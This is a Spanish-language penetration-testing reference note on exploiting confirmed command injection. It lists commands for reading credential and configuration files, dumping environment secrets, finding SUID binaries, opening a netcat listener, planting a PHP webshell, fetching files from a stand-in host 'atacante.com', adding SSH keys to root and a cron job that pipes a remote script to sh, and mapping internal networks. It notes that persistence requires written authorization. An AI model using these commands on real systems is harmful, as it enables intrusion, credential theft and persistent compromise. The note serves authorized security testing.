---
tipo: meta
aliases:
  - Reverse shells
  - Impacto command injection
tags:
  - meta/referencia
  - dominio/web
---

# Command injection impacto - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué hacer una vez confirmada la ejecución. El criterio de **si conviene** llegar hasta acá está en [[Command injection - a shell interactiva]] — abrir una sesión interactiva es el paso que convierte una vulnerabilidad web en un incidente visible.

## 1. Reconocimiento sin abrir sesión

Casi todo lo que hace falta se saca sin shell interactiva y sin conexión saliente. Conviene agotarlo primero.

`id; uname -a; hostname; pwd`
Contexto básico en una sola petición.

`cat /etc/passwd`
`ls -la /home/*/.ssh/`
`cat /var/www/html/config.php`
`env`
Credenciales y configuración. `env` es lo más rentable en contenedores: ahí viven casi siempre los secretos.

`cat /proc/1/cgroup; ls -la /.dockerenv`
¿Es un contenedor? Cambia todo el plan posterior.

`sudo -l`
`find / -perm -4000 -type f 2>/dev/null`
Escalada. Sin TTY, `sudo -l` falla si pide contraseña.

## 2. Reverse shell

Escuchar primero: `nc -lvnp 443`. Se prefiere 443 o 80 — son los puertos que casi siempre salen.

> [!info] Los one-liners viven en el dominio de shells
> Reverse shell por lenguaje (`bash`/`sh`/`nc`/`python`/`php`/`perl`/`ruby`/`socat`/PowerShell) y **cuál elegir según lo que hay en el objetivo**: [[Reverse y bind shells - matriz de referencia]]. El criterio de subir de comando a sesión: [[Command injection - a shell interactiva]]. Se centralizan ahí para no mantener dos copias.

## 3. Promover a TTY completo

Sin TTY no andan `sudo`, `ssh` ni nada a pantalla completa, y `Ctrl-C` mata la sesión entera. El procedimiento completo —PTY, `stty raw -echo`, `TERM`/`rows`/`cols`, y el atajo de `socat`/`pwncat`— en [[Estabilización de shell - matriz de referencia]].

## 4. Webshell en vez de sesión

Cuando conviene no abrir conexión saliente — ver [[Webshell]] para el criterio y [[Webshells - matriz de referencia]] para el código.

`; echo '<?php system($_GET[0]);?>' > /var/www/html/.s.php`
`; curl http://atacante.com/s.php -o /var/www/html/.s.php`
Deja archivo en disco, que es la contrapartida: menos ruido de red, más evidencia persistente.

## 5. Persistencia

> [!warning] Fuera de alcance salvo autorización explícita
> Modificar claves SSH, cron o servicios cambia el estado del sistema y suele estar fuera del alcance de una prueba web. Se documenta la posibilidad; no se ejecuta sin acuerdo por escrito.

`; echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys`
`; (crontab -l; echo '* * * * * curl http://atacante.com/s|sh') | crontab -`

Ambas dejan rastro obvio y ambas hay que revertir.

## 6. Pivote

`; ss -tlnp`
`; cat /etc/hosts`
`; ip route`
Mapear la red interna antes de moverse. En un contenedor, `/etc/hosts` y las variables de entorno suelen revelar los nombres de los demás servicios.
